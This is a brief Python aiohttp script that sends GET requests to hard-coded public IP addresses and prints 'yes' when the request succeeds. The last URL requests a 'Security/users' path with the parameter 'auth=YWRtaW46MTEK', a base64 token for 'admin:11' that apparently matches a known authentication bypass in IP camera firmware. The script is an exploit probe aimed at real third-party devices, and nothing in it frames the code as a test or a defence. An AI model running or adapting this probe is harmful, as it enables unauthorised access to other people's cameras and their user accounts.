import asyncio  
import aiohttp

asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy()) 
url = "http://128.65.186.178/doc/page/login.asp?_1732298658458"
url = 'http://128.65.186.178/ISAPI/Security/users/1'
url = 'http://185.120.251.239/Security/users?auth=YWRtaW46MTEK'
async def main() :
    #session_timeout = aiohttp.ClientTimeout(total=None,sock_connect=10)
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:  
            if response.status == 200 : 
                print('yes')
                
asyncio.run(main())